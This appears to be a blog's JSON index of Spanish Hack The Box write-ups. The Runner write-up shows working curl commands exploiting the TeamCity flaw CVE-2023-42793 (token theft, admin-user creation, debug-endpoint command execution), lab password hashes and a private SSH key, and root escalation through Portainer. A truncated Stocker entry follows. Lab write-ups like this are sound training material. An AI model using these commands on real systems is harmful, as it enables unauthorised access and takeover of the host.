[
  
  {
    "title": "Runner - Hack The Box",
    "url": "/posts/runner/",
    "categories": "htb, linux",
    "tags": "Linux, Web, API, Code, Execution, Suid, CVE, Docker, Portainer",
    "date": "2025-10-17 00:00:00 +0000",
    





    
    "snippet": "Runner es una máquina Linux de dificultad media que contiene una vulnerabilidad [CVE-2023-42793] en TeamCity. Esta vulnerabilidad permite a los usuarios eludir la autenticación y extraer un token A...",
    "content": "Runner es una máquina Linux de dificultad media que contiene una vulnerabilidad [CVE-2023-42793] en TeamCity. Esta vulnerabilidad permite a los usuarios eludir la autenticación y extraer un token API, que puede utilizarse para habilitar funciones de depuración para ejecutar comandos del sistema. Al obtener acceso a un contenedor Docker de TeamCity y comprimir los archivos de la base de datos HSQLDB, podemos extraer las credenciales del usuario matthew y encontrar una clave SSH para john. Después de descifrar la contraseña, podemos autenticarnos en el sistema de archivos del host. Al inspeccionar el archivo /etc/hosts, descubrimos una instancia de Portainer en ejecución. Utilizando las credenciales de «matthew», accedemos al subdominio desde el exterior. Una vez autenticados, descubrimos que podemos crear imágenes, pero nuestros privilegios son limitados. Después de comprobar la versión en el host, explotamos una vulnerabilidad [CVE-2024-21626] a través de la función de creación de imágenes de Portainer, lo que nos permite crear un archivo bash SUID en el hostReconocimientoNmapEn la parte inicial del reconocimiento vamos a iniciar con un escane de puertos basiconmap -p- --open -T3 -n &lt;IP&gt;  -p-          Escanear todo el rango de puertos (65535)        –open          Reportar solo los puertos abiertos        -T3          Aumentar la velocidad de escaneo, existen desde T1 a T5        -n          Anular la resolucion DNS (No hacer resolución DNS) Ya que DNS es generalmente lento, esto acelera un poco las cosas      -&gt; Puertos Abiertos-&gt; 22-&gt; 80-&gt; 8000Nmap Servicios de PuertosPosterior al escaneo de puertos vamos a identificar la version y servicio que corre en cada uno y vamos a guardarlo como archivo de documentacion portsnmap -p22,80,8000 -sCV &lt;IP&gt; -oN portsPORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp   open  http        nginx 1.18.0 (Ubuntu)|_http-title: Runner - CI/CD Specialists|_http-server-header: nginx/1.18.0 (Ubuntu)8000/tcp open  nagios-nsca Nagios NSCA|_http-title: Site doesn't have a title (text/plain; charset=utf-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWebLa web nos redirige a runner.htb, este seria el dominio de la paginaecho '&lt;IP&gt; runner.htb' &gt;&gt; /etc/hostsDe esta manera vamos a incorporarlo a nuestro archivo /etc/hosts donde a la hora de visitar la web nos va a resolver correctamenteComo se muestra en la imagen, esta web solo es estatica y no presenta botones con funcionalidades web como registrarse o loguearse, etc. Voy a probar buscando archivos lekeados con dirsearchEnumeracion Web Fuzzdirsearch --url http://runner.htb/ -t 50     _|. _ _  _  _  _ _|_    v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460Output File: /home/mrincreible/HTB/runner/reports/http_runner.htb/__24-10-28_14-09-52.txtTarget: http://runner.htb/[14:09:52] Starting:                                                                                                                                                       [14:10:18] 301 -  178B  - /assets  -&gt;  http://runner.htb/assets/            [14:10:18] 403 -  564B  - /assets/No encontramos nada relevante en esta parte de fuzzear por archivos o templates de la web, asi que vamos a seguir con la enumeracion de subdominios con wfuzz. Es importante tener una buena metodologia a la hora de enumerar aplicaciones web.Enumeracion Web Fuzz Domainwfuzz -c --hc=404 --hh=154 -t 100 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.runner.htb' http://runner.htb********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://runner.htb/Total requests: 100000=====================================================================ID           Response   Lines    Word       Chars       Payload     =====================================================================000013170:   401        1 L      9 W        66 Ch       \"teamcity\"Agregare este subdominio al /etc/hostsecho '&lt;IP&gt; runner.htb teamcity.runner.htb' &gt;&gt; /etc/hosts nos redirige a http://teamcity.runner.htb/login.htmlEnumeracion Web Team CityQue es TeamCity?Está diseñado para mejorar el proceso de desarrollo de software mediante la automatización de tareas rutinarias como la creación, prueba e implementación de código . TeamCity se destaca por su interfaz fácil de usar, su integración integral con sistemas de control de versiones y sus amplias capacidades de creación, prueba e implementaciónbien!!! tenemos un panel de login de esta app, tenemos que tratar de bypassear este panel. Una vez dentro imagino que habran usuarios y administradores, la version es la 2023.05.03Si realizamos una busqueda en searchsploit?Tenemos un PoC, pero nosotros vamos a leer el codigo y tratar de explotarlo de forma manual.Explotacion [CVE-2023-42793]if url.startswith(\"https://\"):    curl_command = \"curl -k\"else:    curl_command = \"curl\"get_token_url = f\"{url}/app/rest/users/id:1/tokens/RPC2\"delete_token_url = f\"{url}/app/rest/users/id:1/tokens/RPC2\"create_user_url = f\"{url}/app/rest/users\"create_user_command = \"\"token = \"\"response = requests.post(get_token_url, verify=False)En esta parte hace una validacion por si la web tiene SSL, si tiene hace un curl -K de lo contrario realiza un curl normal. Luego hace una llamada por POST a /app/rest/users/id:1/tokens/RPC2 esto te genera un token con privilegios, es ahi donde esta el fallo de TeamCity:El endpoint /app/rest/users/id:1/tokens/RPC2 se encuentra expuesto al publico sin requerir autenticacion, de aqui se puede conseguir un token de autenticacion con privilegios elevados.elif response.status_code == 404:    print(\"Token already exists\")    delete_command = f'{curl_command} -X DELETE {delete_token_url}'    delete_process = subprocess.Popen(delete_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    delete_process.wait()    delete_output = delete_process.communicate()    if delete_process.returncode == 0:        print(\"Previous token deleted successfully\\nrun this command again for creating new token &amp; admin user.\")    else:        print(\"Failed to delete the previous token\")no se pueden generar 2 tokens, pero hay una manera de borrar el token actual que generamos con el Metodo curl -X DELETEif token:    headers = {        \"Authorization\": f\"Bearer {token}\",        \"Content-Type\": \"application/json\"    }    random_chars = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(4))    username = f\"city_admin{random_chars}\"    data = {        \"username\": username,        \"password\": \"Main_password!!**\",        \"email\": \"angry-admin@funnybunny.org\",        \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}    }Luego entramos a esta parte que es la mas interesante, una vez que tengamos el token podemos crear un usuario con privilegios de la siguiente manera, en el PoC agrega las cabezeras Authorization: Bearer {token} y Content-Type: application/json, este exploit crea un usario aleatorio pasandole caracteres extraños, nosotros vamos a modificar eso. En data vamos a poner el nombre de usuario que nosotros queremos y en password lo mismo. Ya Les Muestro un Oneliner potente en CURLAntes de continuar hay que saber lo siguiente: este metodo solo nos crea un usuario con privilegios pero existe otra manera de la cual nos podemos aprovechar ejecutando comandos desde un endpoint. Esto lo vamos a ver despuescurl -s -X POST \"http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2\"&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;&lt;token name=\"RPC2\" creationTime=\"2024-10-28T14:08:19.584Z\" value=\"eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2\"/&gt;en value nos sale el token que obtuvimos, este servira para el siguiente onliner. Estaria ubicandolo en Authorization: eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2curl -s -X POST \"http://teamcity.runner.htb/app/rest/users\" -H 'Authorization: {TOKEN}' -H 'Content-Type: application/json' -d '{\"email\": \"atreus@runner.htb\", \"username\": \"atreus\", \"password\": \"atreus123$!\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}'&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;&lt;user username=\"atreus\" id=\"11\" email=\"atreus@runner.htb\" href=\"/app/rest/users/id:11\"&gt;&lt;properties count=\"3\" href=\"/app/rest/users/id:11/properties\"&gt;&lt;property name=\"addTriggeredBuildToFavorites\" value=\"true\"/&gt;&lt;property name=\"plugin:vcs:anyVcs:anyVcsRoot\" value=\"atreus\"/&gt;&lt;property name=\"teamcity.server.buildNumber\" value=\"129390\"/&gt;&lt;/properties&gt;&lt;roles&gt;&lt;role roleId=\"SYSTEM_ADMIN\" scope=\"g\" href=\"/app/rest/users/id:11/roles/SYSTEM_ADMIN/g\"/&gt;&lt;/roles&gt;&lt;groups count=\"1\"&gt;&lt;group key=\"ALL_USERS_GROUP\" name=\"All Users\" href=\"/app/rest/userGroups/key:ALL_USERS_GROUP\" description=\"Contains all TeamCity users\"/&gt;&lt;/groups&gt;&lt;/user&gt;el resultado es la creacion de un usuario con privilegios de administradorIntrusion Via WebUna vez dentro de la aplicacion web podemos ir a la parte de administracion y abajo nos vamos a encontrar con una seccion de BACKUPHaciendo click en Start Backup se descargara un archivo ZIP. Una vez en tenencia del archivo vamos a descomprimirlo7z l TeamCity_Backup_20241028_142213.zip 7-Zip 24.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19 64-bit locale=C.UTF-8 Threads:128 OPEN_MAX:1024Scanning the drive for archives:1 file, 266056 bytes (260 KiB)Listing archive: TeamCity_Backup_20241028_142213.zip--Path = TeamCity_Backup_20241028_142213.zipType = zipPhysical Size = 266056Comment = TeamCity data backup; ZIP factory in use: memory-conservative (dynamic, shared); compression level -1.   Date      Time    Attr         Size   Compressed  Name------------------- ----- ------------ ------------  ------------------------2024-10-28 14:22:12 .....           92           70  version.txt2024-10-28 14:22:12 .....           45           47  metadata/metadata-version.dat2024-10-28 14:22:12 .....            6            8  charset2024-10-28 14:22:12 .....          637          310  metadata/backup.config2024-10-28 14:22:12 .....        67388        11783  metadata/schema.config2024-10-28 14:22:12 .....           50           46  database_dump/db_version2024-10-28 14:22:12 .....       112098        18694  database_dump/meta_file_line2024-10-28 14:22:12 .....           14           16  database_dump/single_row2024-10-28 14:22:12 .....           88           86  database_dump/server_property2024-10-28 14:22:12 .....          121           97  database_dump/backup_info2024-10-28 14:22:12 .....          151          123  database_dump/domain_sequence2024-10-28 14:22:12 .....          149          128  database_dump/project2024-10-28 14:22:12 .....           95           65  database_dump/vcs_root2024-10-28 14:22:12 .....           85           53  database_dump/project_mapping2024-10-28 14:22:12 .....           46           43  database_dump/vcs_root_mapping2024-10-28 14:22:12 .....           90           68  database_dump/agent_pool2024-10-28 14:22:12 .....           88           82  database_dump/usergroups2024-10-28 14:22:12 .....          428          309  database_dump/users2024-10-28 14:22:12 .....          926          326  database_dump/user_property2024-10-28 14:22:12 .....          257          136  database_dump/usergroup_notification_events2024-10-28 14:22:12 .....          373          165  database_dump/usergroup_watch_type2024-10-28 14:22:12 .....          129           83  database_dump/usergroup_notification_data2024-10-28 14:22:12 .....           53           55  database_dump/remember_me2024-10-28 14:22:12 .....          286          219  database_dump/permanent_tokens2024-10-28 14:22:12 .....           48           45  database_dump/user_projects_visibility2024-10-28 14:22:12 .....           51           49  database_dump/agent_pool_project2024-10-28 14:22:12 .....          135           93  database_dump/vcs_username2024-10-28 14:22:12 .....           42           43  database_dump/build_queue_order2024-10-28 14:22:12 .....          125           87  database_dump/user_roles2024-10-28 14:22:12 .....           71           58  database_dump/usergroup_roles2024-10-28 14:22:12 .....          370          208  database_dump/stats_publisher_state2024-10-28 14:22:12 .....          690          320  database_dump/comments2024-10-28 14:22:12 .....          346          167  database_dump/action_history2024-10-28 14:22:12 .....          766          293  database_dump/audit_additional_object2024-10-28 14:22:12 .....         1543          341  database_dump/server_statistics2024-10-28 14:22:12 .....        27042         2291  database_dump/node_tasks2024-10-28 14:22:12 .....          116          110  database_dump/node_locks2024-10-28 14:22:12 .....          163          122  database_dump/server_health_items2024-10-28 14:22:12 .....           25           24  database_dump/hidden_health_item2024-10-28 14:22:12 .....         1182          350  database_dump/config_persisting_tasks2024-10-28 14:22:12 .....           24           26  database_dump/server2024-10-28 12:47:24 .....          311          204  config/_notifications/ide_notificator/tests_unmuted.ftl.dist2024-10-28 12:46:38 .....        24199         2312  config/_logging/debug-commit-status.xml2024-10-28 12:47:24 .....          434          274  config/_notifications/ide_notificator/build_probably_hanging.ftl.distbackups de bases de datos, quizas podemos encontrar algunos hashes crackeables. Antes de seguir con eso y no volvernos locos a la hora de enumerar estas bases de datos, vamos a buscar en teamcity que usuarios validos tenemos:  Admin          John -&gt; John@runner.htb        Matthew          Matthew -&gt; Matthew@runner.htb      Usuarios validos a nivel de sistema, tenemos el puerto 22 abierto esto quiere decir que la shell tiene que venir por ese puerto.Lo siguiente sera filtrar con el comando grep por hashes para crackearlosgrep -ri \"john\"database_dump/comments:201, -42, 1709746543407, \"New username: \\'admin\\', new name: \\'John\\', new email: \\'john@runner.htb\\'\"database_dump/users:1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1730124582065, BCRYPTgrep -ri \"matthew\"database_dump/vcs_username:2, anyVcs, -1, 0, matthewdatabase_dump/users:2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPTconfig/_trash/AllProjects.project1/project-config.xml:  &lt;description&gt;Matthew's projects&lt;/description&gt;config/projects/AllProjects/project-config.xml.1:  &lt;description&gt;Matthew's projects&lt;/description&gt;system/pluginData/audit/configHistory/projects/project1/config.xml.1:  &lt;description&gt;Matthew's projects&lt;/description&gt;logramos ver el hash de admin y matthew que son los usuarios a nivel de sistema o contenedor.  admin          $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye        matthew          $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em      vamos intentar crackearlos con johntheripper pasandole el diccionario rockyou.txt que es un diccionario grande y tipico en estos ataques de crackeo de contraseñas.john --show hash                                     ?:piper1231 password hash cracked, 0 leftsolo nos crackea uno, el otro hash queda ahi… vamos a intentar entrar por ssh con esta contraseña pasandole el usuario john y matthew pero no sirve para ninguno, asi que no perdamos tiempo con esto. Vamos a seguir enumerando buscando alguna id_rsafind . -name \"id_rsa\" 2&gt;/dev/null | cat ./config/projects/AllProjects/pluginData/ssh_keys/id_rsa -----BEGIN OPENSSH PRIVATE KEY-----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Bingo…. Tenemos una clave privada id_rsa para entrar por ssh y ejecutar comandos, muy bien… ya llegamos hasta esta parte… ahora voy a explicar otra manera para conseguir RCE en la maquina…. nos vamos a aprovechar de un endpoint de teamcity.Intrusion Via Web Metodo 2Para este metodo el post CVE-2023-42793 nos indica que tenemos que habilitar el modo debug para conseguir RCEcurl -s -X POST \"http://teamcity.runner.htb/app/rest/debug/processes?exePath=id\" -H 'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2' Responding with error, status code: 400 (Bad Request).Details: jetbrains.buildServer.server.rest.errors.BadRequestException: This server is not configured to allow process debug launch via \"rest.debug.processes.enable\" internal propertyInvalid request. Please check the request URL and data are correct.nos tira ese error porque todavia no habilitamos el modo debug, asi que vamos a hacerlocurl -X POST 'http://teamcity.runner.htb/admin/dataDir.html?action=edit&amp;fileName=config%2Finternal.properties&amp;content=rest.debug.processes.enable=true' -H 'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2'bien, ahora la parte final es volver a ejecutar el primer comando que realizamoscurl -s -X POST \"http://teamcity.runner.htb/app/rest/debug/processes?exePath=id\" -H 'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2'StdOut:uid=1000(tcuser) gid=1000(tcuser) groups=1000(tcuser)StdErr: Exit code: 0Time: 27msaclaro que este token es el primero que me dio teamcity a la hora de crear mi usuario con privilegios maximos si necesitan volver a generarlo en la explicacion del PoC explico como borrar el token y por logica crear otro. Yo prefiero obtener una shell por SSH porque es mas comodo la TTY.A la clave privada le tienen que asignar privilegios 600 con chmod y luego pasarle el -i para importar la id_rsaEscalada de PrivilegiosEnumerando los puertos abiertos dentro de la maquina nos encontramos con el puerto 9000 abierto internamente, posterior a eso con ps queremos ver lo que se esta ejecutando en ese puerto, pero sin exito.john@runner:~$ mount | grep procproc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=invisible)systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=29,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=19243)binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)No podemos ver procesos que corren de otros usuarios en el hipeid -&gt; esta en invisiblejohn@runner:~$ curl -s http://localhost:9000 | head -n 3&lt;!doctype html&gt;&lt;html lang=\"en\" ng-app=\"portainer\" ng-strict-di data-edition=\"CE\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"/&gt;&lt;title&gt;Portainer&lt;/title&gt;&lt;meta name=\"description\" content=\"\"/&gt;&lt;meta name=\"author\" content=\"Portainer.io\"/&gt;&lt;meta http-equiv=\"cache-control\" content=\"no-cache\"/&gt;&lt;meta http-equiv=\"expires\" content=\"0\"/&gt;&lt;meta http-equiv=\"pragma\" content=\"no-cache\"/&gt;&lt;base id=\"base\"/&gt;&lt;script&gt;if (window.origin == 'file://') {        // we are loading the app from a local file as in docker extension        document.getElementById('base').href = 'http://localhost:49000/';Viendo lo que hay en el puerto 9000, notamos que es un portainer.io y vemos la palabra docker… ahora todo tiene sentido con las 2 intrusiones, si hubiesemos entrado con el RCE del metodo debug hubieramos ganado acceso dentro de un contendor portainer, teniendo en cuenta todo esto vamos a realizar un Local Port Fordwarding con SSHEs importante anotar todo lo que conseguimos a la hora de enumerar la maquina, recordemos que tenemos credenciales de matthew y no nos sirivieron para nada. En esta ocasion puede ser que funcioneQue es Portainer?Portainer es una herramienta web open-source la cual se ejecuta ella misma como un container, por tanto deberemos tener Docker instalado. Esta aplicación nos va a permitir gestionar de forma muy fácil e intuitiva nuestros contenedores Docker a través de una interfaz gráfica.Listo estamos dentro de portainer lo primero que haria como atacante es buscar en que version estamos y ir viendo como podemos aprovecharnos de los contenedores, podemos ver malas configuraciones de docker o vulnerabilidades asociadas a CVEs.Si clickeo en primary tenemos mas opciones y configuraciones las mas importantes son imagesTenemos 2 imagenes: ubuntu:latest, teamcity:latestTambien tenemos 2 volumenes, un volumen en docker es un área de almacenamiento de datos que puede montarse en un contenedor para proporcionar almacenamiento persistente, si leemos la documentacion de portainer nos muestra como crear un volumen. Yo creo que esta seria nuestra via para escalar privilegios.Le damos a add volume y agregamos estas configuraciones para crear el volumenCon esto ya tendriamos creado el nuevo volumen.Ahora nos dirigimos a containers y clickeamos a add container para crear un nuevo contenedorNombre test y en la imagen ponemos la imagen teamcity:latest… y abajo en configuracion avanzada vamos a agregar estos parametros.. Interactive &amp; TTY y en volumes /mnt/root para traernos la maquina real como una monturaClickeamos en deploy the container…. una vez que se cree vamos a clickear en el contenedor y darle en console para conseguir una shell grafica en la webEn user vamos a poner root y a darle a connect y listo…. en la carpeta mnt/root vamos a tener la maquina real y darle permisos SUID a la bash para escalar privilegios"
  },
  
  {
    "title": "Stocker - Hack The Box",
    "url": "/posts/stocker/",
    "categories": "htb, linux",
    "tags": "Linux, Fuzz, Wfuzz, LFI, API, Curl, App, Web, Mongo, NoSQL, XSS, Javascript",
    "date": "2025-10-14 00:00:00 +0000",
    





    
    "snippet": "Stocker es una máquina Linux de dificultad media que cuenta con un sitio web que se ejecuta en el puerto 80 y que anuncia diversos muebles para el hogar. A través de la enumeración vHost, se identi...",
    "content": "Stocker es una máquina Linux de dificultad media que cuenta con un sitio web que se ejecuta en el puerto 80 y que anuncia diversos muebles para el hogar. A través de la enumeración vHost, se identifica el nombre de host dev.stocker.htb y, al acceder a él, se carga una página de inicio de sesión que parece estar construida con NodeJS. Al enviar datos JSON y realizar una inyección NoSQL, se omite la página de inicio de sesión y se concede acceso a una tienda electrónica. La enumeración de esta tienda electrónica revela que, al enviar un pedido de compra, se crea un PDF que contiene detalles sobre los artículos comprados. Esta funcionalidad es vulnerable a la inyección de HTML y puede utilizarse indebidamente para leer archivos del sistema mediante el uso de iframes. A continuación, se lee el archivo index.js para obtener las credenciales de la base de datos y, debido a la reutilización de contraseñas, los usuarios pueden iniciar sesión en el sistema a través de SSH. A continuación, se pueden escalar los privilegios realizando un ataque de recorrido de ruta en un comando definido en el archivo sudoers, que contiene un comodín para ejecutar archivos JavaScript.ReconocimientoNmapnmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.196Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 08:43 EDTInitiating SYN Stealth Scan at 08:43Scanning 10.10.11.196 [65535 ports]Discovered open port 22/tcp on 10.10.11.196Discovered open port 80/tcp on 10.10.11.196Completed SYN Stealth Scan at 08:44, 17.18s elapsed (65535 total ports)Nmap scan report for 10.10.11.196Host is up, received user-set (0.15s latency).Scanned at 2024-04-29 08:43:56 EDT for 18sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63Tenemos 2 puertos abiertos22 -&gt; SSH80 -&gt; HTTPNmap Servicios de Puertosnmap -p22,80 -sCV 10.10.11.196Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 08:48 EDTNmap scan report for stocker.htb (10.10.11.196)Host is up (0.20s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Stock - Coming Soon!|_http-generator: Eleventy v2.0.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTecnologias Webwhatweb http://10.10.11.196http://10.10.11.196 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.196], RedirectLocation[http://stocker.htb], Title[301 Moved Permanently], nginx[1.18.0]En esta fase de reconocimiento logramos ver un dominio stocker.htb vamos a colocarlo dentro del archivo /etc/hosts para que nos redirija la ip al dominio y poder ingresar a la web real.echo '10.10.11.196 stocker.htb' &gt;&gt; /etc/hostsWebEnumeracion Web Fuzzwfuzz -c --hc=404 --hh=15463 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \"http://stocker.htb/FUZZ\" /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://stocker.htb/FUZZTotal requests: 220560=====================================================================ID           Response   Lines    Word       Chars       Payload                              =====================================================================000000039:   301        7 L      12 W       178 Ch      \"img\"                             000000550:   301        7 L      12 W       178 Ch      \"css\"                                                           000000953:   301        7 L      12 W       178 Ch      \"js\"                                                                     000002771:   301        7 L      12 W       178 Ch      \"fonts\"En esta parte encontramos cosas tipicas que existen en una web, sin embargo no son de relevancia. Tener una buena metodologia de enumeracion hace que puedas llegar mas alla y conseguir muchas vias de explotacion.Enumeracion Web Fuzz Domainwfuzz -c --hc=404 --hh=178,166 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H \"Host: FUZZ.stocker.htb\" http://stocker.htb /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://stocker.htb/=====================================================================ID           